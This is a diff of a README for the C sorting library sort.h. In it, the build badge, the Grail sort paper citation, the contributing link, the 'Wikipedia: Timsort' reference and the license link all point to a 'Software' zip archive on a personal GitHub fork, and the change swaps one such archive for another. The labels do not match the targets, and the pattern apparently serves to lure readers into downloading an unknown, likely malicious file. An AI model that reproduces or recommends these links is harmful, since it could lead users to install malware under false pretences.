@@ -1,7 +1,7 @@
 sort.h
 ======
 
-<a href="https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip"><img alt="build status" src="https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip" /></a>
+<a href="https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip"><img alt="build status" src="https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip" /></a>
 
 Overview
 --------
@@ -28,7 +28,7 @@ You get the choice of many sorting routines, including:
 * Timsort (stable)
 * Grail sort (stable)
   * Based on [`B-C. Huang and M. A. Langston, *Fast Stable Merging and Sorting in
-  Constant Extra Space* (1989-1992)`](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip).
+  Constant Extra Space* (1989-1992)`](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip).
 
     Thanks to Andrey Astrelin for the implementation.
 * Sqrt Sort (stable, based on Grail sort, also by Andrey Astrelin).
@@ -136,15 +136,15 @@ and timsort also often tend to be quite fast.
 Contributing
 ------------
 
-See [https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip).
+See [https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip).
 
 References
 ----------
 
-* [Wikipedia: Timsort](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip)
-* [`https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip`](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip)
+* [Wikipedia: Timsort](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip)
+* [`https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip`](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip)
 
 License
 -------
 
-Available under the MIT License. See [https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software_v2.9.zip) for details.
+Available under the MIT License. See [https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip](https://raw.githubusercontent.com/mpathroliya/sort/master/doc/Software-v2.4.zip) for details.
